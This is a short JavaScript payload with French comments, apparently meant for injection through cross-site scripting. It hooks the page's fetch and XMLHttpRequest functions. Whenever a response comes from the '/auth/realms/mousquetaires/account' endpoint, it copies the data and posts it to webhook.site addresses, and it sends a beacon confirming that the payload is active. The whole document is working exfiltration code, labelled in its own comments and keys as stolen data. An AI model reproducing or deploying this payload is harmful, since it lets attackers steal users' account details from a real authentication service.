// === Hook fetch pour intercepter la réponse cible ===
(function() {
  const originalFetch = window.fetch;

  window.fetch = async function(...args) {
    const response = await originalFetch.apply(this, args);

    // Si la requête vise la route sensible, on exfiltre
    if (args[0].includes('/auth/realms/mousquetaires/account')) {
      const clonedResponse = response.clone();

      clonedResponse.json().then(data => {
        fetch('https://webhook.site/a38cc994-a3d8-451b-a041-85ff3fd11bdd', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            stolenUrl: args[0],
            stolenData: data
          })
        });
      });
    }

    return response;
  };

  // === Hook XMLHttpRequest pour compléter l'interception ===
  const origOpen = XMLHttpRequest.prototype.open;
  XMLHttpRequest.prototype.open = function(method, url) {
    this._url = url;
    return origOpen.apply(this, arguments);
  };

  const origSend = XMLHttpRequest.prototype.send;
  XMLHttpRequest.prototype.send = function(body) {
    this.addEventListener('load', function() {
      if (this._url.includes('/auth/realms/mousquetaires/account')) {
        fetch('https://webhook.site/49e19250-e4fd-4b9e-86dc-6a9a8d434b50', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            url: this._url,
            data: this.responseText
          })
        });
      }
    });
    return origSend.apply(this, arguments);
  };

  // === Optionnel : envoie un message pour valider l'exécution ===
  fetch('https://webhook.site/49e19250-e4fd-4b9e-86dc-6a9a8d434b50', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      status: 'Payload injecté et actif'
    })
  });
})();
